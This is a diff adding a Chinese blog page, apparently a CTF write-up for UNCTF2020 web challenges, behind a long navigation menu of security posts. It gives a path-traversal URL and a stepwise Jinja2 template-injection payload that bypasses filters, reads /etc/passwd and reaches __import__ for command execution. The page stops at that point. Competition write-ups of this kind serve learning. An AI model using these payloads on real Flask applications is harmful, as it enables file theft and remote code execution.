@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          UNCTF2020-Web-Writeup - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+<li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8">CTFShow—Web入门</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+<li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024杯 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+<li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-11-19&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">2.9k</span>
+  
+  <h1 id="UNCTF2020-Web-wp">UNCTF2020 Web wp</h1>
+<h2 id="easyssrf-solved">easyssrf [solved]</h2>
+<p>算是签到题，比较easy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<h2 id="easyflask-solved">easyflask [solved]</h2>
+<p>Fuzz了一下，发现过滤挺多东西的。<br>
+只能用管道+join的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</span><br></pre></td></tr></table></figure>
+<p>等价于<code>().__class__</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base</span><br></pre></td></tr></table></figure>
+<p>等价于<code>().__class__.__base__</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses</span><br></pre></td></tr></table></figure>
+<p><code>().__class__.__base__.subclasses()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)&#125;</span><br></pre></td></tr></table></figure>
+<p><code>().__class__.base__.subclasses().pop(475)</code><br>
+click.utils.LazyFile</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>但是不知道flag在哪，所以还是要执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>选取的模块<code>&lt;class '_frozen_importlib._DummyModuleLock'&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)|attr((request.args.usc*2,request.args.init,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.import,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;init&#x3D;init&amp;globals&#x3D;globals&amp;builtins&#x3D;builtins&amp;import&#x3D;import</span><br></pre></td></tr></table></figure>
